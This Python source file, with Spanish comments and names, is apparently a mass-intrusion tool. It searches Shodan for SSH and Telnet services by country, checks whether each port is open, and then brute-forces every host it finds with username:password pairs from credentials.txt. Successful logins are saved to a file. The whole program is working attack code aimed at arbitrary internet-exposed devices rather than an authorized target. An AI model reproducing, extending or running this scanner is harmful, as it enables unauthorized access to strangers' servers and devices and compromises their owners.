import argparse
import socket
import paramiko
import pexpect
import shodan
import logging
from config import API_KEY, SERVICIOS, PAISES, LIMITE_BUSQUEDA
from gui import lanzar_gui

ACCESO_OK_FILE = "Acceso_exitoso.txt"

# Configurar logging para archivo 'errores.log' + consola
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Log a archivo
file_handler = logging.FileHandler("errores.log")
file_handler.setLevel(logging.INFO)
file_format = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s', "%Y-%m-%d %H:%M:%S")
file_handler.setFormatter(file_format)
logger.addHandler(file_handler)

# Log a consola
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_format = logging.Formatter('%(levelname)s: %(message)s')
console_handler.setFormatter(console_format)
logger.addHandler(console_handler)

def puerto_abierto(ip, puerto):
    try:
        with socket.create_connection((ip, puerto), timeout=3):
            return True
    except Exception as e:
        logger.warning(f"No se pudo conectar a {ip}:{puerto} - {e}")
        return False

def validar_ssh(ip, puerto, usuario, clave):
    try:
        logger.info(f"[SSH] Probando {usuario}:{clave} en {ip}:{puerto}")
        cliente = paramiko.SSHClient()
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cliente.connect(ip, port=puerto, username=usuario, password=clave, timeout=5)
        cliente.close()
        return True
    except paramiko.ssh_exception.SSHException as e:
        logger.error(f"[SSH] Fallo en {ip}:{puerto} con {usuario}:{clave} - SSHException: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"[SSH] Fallo en {ip}:{puerto} con {usuario}:{clave} - {type(e).__name__}: {str(e)}")
        return False

def validar_telnet(ip, puerto, usuario, clave):
    try:
        logger.info(f"[TELNET] Probando {usuario}:{clave} en {ip}:{puerto}")
        child = pexpect.spawn(f'telnet {ip} {puerto}', timeout=5)
        child.expect("login:")
        child.sendline(usuario)
        child.expect("Password:")
        child.sendline(clave)
        index = child.expect([">", "#", "incorrect", pexpect.EOF, pexpect.TIMEOUT])
        child.close()
        return index in [0, 1]
    except Exception as e:
        logger.error(f"[TELNET] Fallo en {ip}:{puerto} con {usuario}:{clave} - {type(e).__name__}: {str(e)}")
        return False

def callback_iniciar_progresivo(on_nueva_ip):
    api = shodan.Shodan(API_KEY)
    encontrados = []
    exitosos = []

    try:
        with open("credentials.txt") as f:
            creds = [line.strip().split(":") for line in f if ":" in line]
    except FileNotFoundError:
        logger.error("El archivo credentials.txt no fue encontrado.")
        return [], []

    for servicio in SERVICIOS:
        for pais in PAISES:
            query = f"{servicio} country:{pais}"
            try:
                logger.info(f"🔍 Ejecutando búsqueda: '{query}'")
                resultados = api.search(query, limit=LIMITE_BUSQUEDA)
                logger.info(f"✅ {len(resultados['matches'])} resultados encontrados")
                for match in resultados['matches']:
                    ip = match['ip_str']
                    port = match['port']
                    country = match.get('location', {}).get('country_name', 'Desconocido')

                    logger.info(f"📡 IP encontrada: {ip}:{port} ({servicio.upper()}) - {country}")

                    if not puerto_abierto(ip, port):
                        logger.warning(f"⚠️  Puerto {port} cerrado en {ip}")
                        continue

                    nuevo = {'ip': ip, 'servicio': servicio, 'puerto': port, 'pais': country}
                    encontrados.append(nuevo)
                    on_nueva_ip(nuevo)

                    for user, pwd in creds:
                        acceso = False
                        if servicio == "ssh":
                            acceso = validar_ssh(ip, port, user, pwd)
                        elif servicio == "telnet":
                            acceso = validar_telnet(ip, port, user, pwd)

                        if acceso:
                            nuevo['usuario'] = user
                            nuevo['password'] = pwd
                            exitosos.append(nuevo)
                            with open(ACCESO_OK_FILE, "a") as f:
                                f.write(f"{ip}:{port} [{servicio.upper()}] - {user}:{pwd} - {country}\n")
                            logger.info(f"✅ ACCESO EXITOSO: {ip}:{port} ({servicio.upper()}) - {user}:{pwd}")
                            break
            except Exception as e:
                logger.error(f"[!] Error en búsqueda Shodan con '{query}': {type(e).__name__}: {str(e)}")
    return encontrados, exitosos

def escanear_y_validar():
    return callback_iniciar_progresivo(lambda _: None)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cli", action="store_true", help="Ejecutar en modo línea de comandos")
    args = parser.parse_args()

    if args.cli:
        logger.info("🖥️ Ejecutando en modo CLI...")
        encontrados, exitosos = escanear_y_validar()
        logger.info(f"IPs encontradas: {len(encontrados)}")
        logger.info(f"Accesos exitosos: {len(exitosos)}")
    else:
        lanzar_gui(callback_iniciar_progresivo)

if __name__ == "__main__":
    main()
